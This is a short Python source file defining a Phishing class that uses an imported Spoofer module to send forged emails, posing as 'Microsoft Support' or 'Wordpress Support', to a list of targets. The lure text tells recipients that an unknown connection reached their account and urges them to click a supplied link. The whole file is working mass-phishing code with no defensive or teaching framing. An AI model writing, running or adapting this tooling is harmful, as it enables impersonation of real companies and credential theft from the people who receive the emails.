from spoofer import Spoofer

class Phishing:
    def __init__(self, to_addr_list, service, from_addr = "", link = ""):
        self.sp = Spoofer()
        self.from_addr = from_addr
        print(self.from_addr)
        self.to_addr_list = to_addr_list
        self.subject = "Repair your email"
        self.link = link
        self.data = f"Hello, There was an unknown connection to your account. Please enter this link to make sure your account is secure: {self.link}"
        if service == "MICROSOFT":
            self.fake_sender_name = "Microsoft Support"
        else:
            self.fake_sender_name = "Wordpress Support"
        self.service = service
        self.amount = len(self.to_addr_list)
    
    def spoof(self):
        for email in self.to_addr_list:
            self.sp.spoof(self.from_addr, email, self.subject, self.data, self.fake_sender_name)